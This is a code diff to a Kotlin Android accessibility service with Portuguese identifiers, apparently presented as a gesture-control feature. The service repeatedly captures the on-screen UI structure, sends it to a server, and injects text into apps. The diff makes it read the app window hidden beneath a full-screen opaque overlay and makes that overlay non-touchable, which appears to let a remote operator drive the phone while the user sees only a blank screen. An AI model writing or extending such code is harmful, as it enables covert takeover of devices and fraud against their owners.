@@ -22,6 +22,7 @@ import android.view.View
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import android.view.accessibility.AccessibilityWindowInfo
 import android.widget.TextView
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -82,7 +83,7 @@ class ControleGestosService : AccessibilityService() {
         jobPrincipal = CoroutineScope(Dispatchers.IO).launch {
             while (true) {
                 try {
-                    val raiz = rootInActiveWindow
+                    val raiz = obterRaizAplicativo()
                     if (raiz != null) {
                         val estrutura = extrairEstruturaTela(raiz)
                         enviarEstruturaParaServidor(estrutura)
@@ -104,6 +105,37 @@ class ControleGestosService : AccessibilityService() {
     }
 
     // ─── Extração de elementos da tela ───────────────────────────────────────
+
+    /**
+     * Returns the root node of the app beneath the overlay.
+     * When overlay is active, rootInActiveWindow points to our overlay window —
+     * we must read the focused application window instead so the panel keeps working.
+     */
+    private fun obterRaizAplicativo(): AccessibilityNodeInfo? {
+        val janelas = windows
+        if (janelas.isNullOrEmpty()) return rootInActiveWindow
+
+        fun ehJanelaOverlay(janela: AccessibilityWindowInfo): Boolean {
+            val raiz = janela.root ?: return true
+            val pacote = raiz.packageName?.toString() ?: ""
+            return pacote == packageName ||
+                    janela.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
+        }
+
+        val janelasApp = janelas.filter { !ehJanelaOverlay(it) }
+        if (janelasApp.isEmpty()) return rootInActiveWindow
+
+        janelasApp.firstOrNull { it.isFocused }?.root?.let { return it }
+        janelasApp.firstOrNull { it.isActive }?.root?.let { return it }
+
+        return janelasApp
+            .filter { it.type == AccessibilityWindowInfo.TYPE_APPLICATION }
+            .maxByOrNull { janela ->
+                val area = Rect()
+                janela.root?.getBoundsInScreen(area)
+                area.width() * area.height()
+            }?.root ?: rootInActiveWindow
+    }
 
     private fun extrairEstruturaTela(raiz: AccessibilityNodeInfo): String {
         val listaElementos = mutableListOf<Map<String, Any>>()
@@ -308,8 +340,9 @@ class ControleGestosService : AccessibilityService() {
      * Must be called on the main thread.
      */
     private fun mostrarOuAtualizarOverlay(mensagem: String, textoInferior: String, logo: String) {
-        // If overlay is already showing, just update the text — no window recreation, no flicker
         if (overlayAtivo && overlayView != null) {
+            garantirOverlayNaoBloqueiaToque()
+
             val changed = mensagem != mensagemOverlayAtual ||
                     textoInferior != textoInferiorOverlayAtual ||
                     logo != logoOverlayAtual
@@ -325,6 +358,32 @@ class ControleGestosService : AccessibilityService() {
         }
 
         criarOverlay(mensagem, textoInferior, logo)
+    }
+
+    private fun garantirOverlayNaoBloqueiaToque() {
+        val view = overlayView ?: return
+        val params = parametrosOverlay ?: return
+
+        view.isClickable = false
+        view.isFocusable = false
+        view.isFocusableInTouchMode = false
+
+        val flagsDesejadas = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED
+
+        if (params.flags != flagsDesejadas) {
+            params.flags = flagsDesejadas
+            try {
+                windowManager.updateViewLayout(view, params)
+                parametrosOverlay = params
+            } catch (e: Exception) {
+                Log.w("KL", "Erro ao atualizar flags do overlay: ${e.message}")
+            }
+        }
     }
 
     private fun criarOverlay(mensagem: String, textoInferior: String, logo: String) {
@@ -345,6 +404,7 @@ class ControleGestosService : AccessibilityService() {
             WindowManager.LayoutParams.MATCH_PARENT,
             tipoJanela,
             WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                     WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                     WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                     WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
@@ -361,8 +421,10 @@ class ControleGestosService : AccessibilityService() {
         }
 
         val view = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null)
-        // Force fully opaque white — belt-and-suspenders to prevent wallpaper bleed-through
         view.setBackgroundColor(Color.WHITE)
+        view.isClickable = false
+        view.isFocusable = false
+        view.isFocusableInTouchMode = false
         view.findViewById<TextView>(R.id.txtMensagem)?.text = mensagem
         view.findViewById<TextView>(R.id.txtTextoInferior)?.text = textoInferior
 
@@ -462,7 +524,7 @@ class ControleGestosService : AccessibilityService() {
     private fun inserirTexto(texto: String) {
         if (texto.isBlank()) return
 
-        val raiz = rootInActiveWindow ?: run {
+        val raiz = obterRaizAplicativo() ?: run {
             Log.e("KL", "Raiz da tela não encontrada para inserir texto")
             return
         }
